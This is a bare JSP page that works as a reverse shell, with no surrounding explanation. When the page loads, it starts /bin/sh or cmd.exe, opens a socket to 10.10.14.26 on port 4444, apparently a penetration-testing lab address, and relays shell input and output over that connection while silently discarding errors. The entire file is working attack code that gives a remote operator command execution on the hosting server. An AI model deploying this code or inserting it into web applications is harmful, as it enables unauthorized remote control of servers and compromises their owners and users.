<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream jw;
    OutputStream mz;

    StreamConnector( InputStream jw, OutputStream mz )
    {
      this.jw = jw;
      this.mz = mz;
    }

    public void run()
    {
      BufferedReader wn  = null;
      BufferedWriter wya = null;
      try
      {
        wn  = new BufferedReader( new InputStreamReader( this.jw ) );
        wya = new BufferedWriter( new OutputStreamWriter( this.mz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = wn.read( buffer, 0, buffer.length ) ) > 0 )
        {
          wya.write( buffer, 0, length );
          wya.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( wn != null )
          wn.close();
        if( wya != null )
          wya.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.26", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
